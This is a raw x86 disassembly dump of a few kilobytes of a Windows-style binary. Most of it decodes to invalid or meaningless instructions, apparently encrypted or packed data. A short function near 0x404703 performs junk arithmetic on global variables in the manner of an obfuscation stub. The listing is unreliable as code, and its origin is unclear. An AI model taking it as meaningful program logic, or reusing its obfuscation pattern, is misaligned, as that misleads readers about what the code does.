  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412300
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417d29,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x4122f8
  404736:	and    DWORD PTR ds:0x41aa4e,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4233cf,0x412308
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417d25,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4233d7,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4233d7,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412300
  404789:	and    DWORD PTR ds:0x415041,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41aa42,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x1b2487ea
  4047be:	aas    
  4047bf:	retf   0x7e7e
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fxch   st(4)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [edx]
  4047d5:	pop    esi
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
